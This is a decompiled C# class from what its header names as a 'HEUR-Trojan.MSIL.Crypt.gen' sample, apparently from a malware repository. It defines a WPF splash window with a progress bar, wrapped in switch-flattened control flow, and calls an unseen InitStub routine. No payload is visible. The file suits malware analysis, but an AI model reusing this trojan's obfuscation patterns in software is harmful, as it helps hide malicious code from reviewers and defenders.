// Decompiled with JetBrains decompiler
// Type: IEnumUnkn.Structs.PageVisitorStruct
// Assembly: IEnumUnkn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA80F1E7-116A-4A8E-96EA-FFB7A6C2BB6E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-4e20a72f2791a602f8ee9999765a9365729ff929da4d5fa6be7bfb4c20e9989e.exe

using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Markup;

namespace IEnumUnkn.Structs
{
  public class PageVisitorStruct : Window, IComponentConnector
  {
    internal ProgressBar progressBar;
    private bool _Code;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public PageVisitorStruct()
    {
      int num1 = 2;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              ListenerManager.InitStub();
              if (true)
              {
                num2 = 3;
                continue;
              }
              goto label_2;
            case 1:
            case 3:
              goto label_3;
            case 4:
              goto label_2;
            case 5:
              goto label_9;
            default:
              if (true)
              {
                num2 = 4;
                continue;
              }
              goto label_7;
          }
        }
label_2:
        this.InitializeComponent();
        num1 = 5;
        continue;
label_3:
        // ISSUE: explicit constructor call
        base.\u002Ector();
        goto label_2;
      }
label_9:
      return;
label_7:;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public double GetField() => this.progressBar.Value;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void MoveField(double setup) => this.progressBar.Value = setup;

    [DebuggerNonUserCode]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InitializeComponent()
    {
      int num = 5;
      bool code;
      Uri resourceLocator;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 5:
            code = this._Code;
            num = 4;
            continue;
          case 1:
            goto label_9;
          case 2:
            goto label_10;
          case 3:
            Application.LoadComponent((object) this, resourceLocator);
            num = 6;
            continue;
          case 4:
            if (code)
            {
              num = 1;
              continue;
            }
            this._Code = true;
            resourceLocator = new Uri("/IEnumUnkn;component/splashscreenwindow.xaml", UriKind.Relative);
            goto case 3;
          case 6:
            goto label_8;
          default:
            num = 3;
            continue;
        }
      }
label_9:
      return;
label_10:
      return;
label_8:;
    }

    [DebuggerNonUserCode]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [EditorBrowsable(EditorBrowsableState.Never)]
    [MethodImpl(MethodImplOptions.NoInlining)]
    void IComponentConnector.Connect(int max_instance, object map)
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        int num3;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_3;
            case 1:
            case 3:
              goto label_8;
            case 2:
            case 4:
              goto label_4;
            case 5:
              num3 = max_instance;
              if (PageVisitorStruct.FlushObject())
              {
                num2 = 3;
                continue;
              }
              goto label_10;
            case 6:
              goto label_1;
            default:
              goto label_7;
          }
        }
label_3:
        this._Code = true;
        num1 = 6;
        continue;
label_4:
        int num4;
        if (num4 == 1)
          break;
        goto label_3;
label_7:
        num1 = 0;
        continue;
label_8:
        num4 = num3;
        num1 = 4;
      }
      this.progressBar = (ProgressBar) map;
      return;
label_1:
      return;
label_10:;
    }

    internal static bool FlushObject() => true;

    internal static bool StopObject() => false;
  }
}
